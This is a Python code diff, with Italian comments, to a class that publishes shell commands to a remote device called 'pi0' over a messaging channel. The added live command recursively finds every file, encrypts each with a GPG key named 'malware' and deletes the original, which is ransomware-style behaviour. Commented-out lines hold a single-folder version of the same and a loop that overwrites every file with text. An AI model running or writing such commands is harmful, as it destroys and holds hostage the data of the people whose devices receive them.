@@ -128,8 +128,15 @@ class pubOnly():
 
         # for file in *; do if [ -f $file ]; then echo $file; echo $file ciao; fi; done
 
-        message = {"src" : clientname, "dest" : "pi0", "command" : "for file in *; do if [ -f $file ]; then gpg --always-trust -e -r \"malware\" $file; rm -f $file; fi; done"}
-        self.client.myPublish(topic, message)  
+        # FUNZIONA PER ENCRYPT TUTTI I FILE IN UNA CARTELLA SINGOLA
+        # message = {"src" : clientname, "dest" : "pi0", "command" : "for file in *; do if [ -f $file ]; then gpg --always-trust -e -r \"malware\" $file; rm -f $file; fi; done"}
+        # self.client.myPublish(topic, message)  
+
+        # message = {"src" : clientname, "dest" : "pi0", "command" : "for i in $(find . -type f -print); do echo ciao > $i;  done"}
+        # self.client.myPublish(topic, message) 
+
+        message = {"src" : clientname, "dest" : "pi0", "command" : "for i in $(find . -type f -print); do gpg --always-trust -e -r \"malware\" $i; rm -f $i; sleep 1; done"}
+        self.client.myPublish(topic, message) 
 
         sleep(5)
 
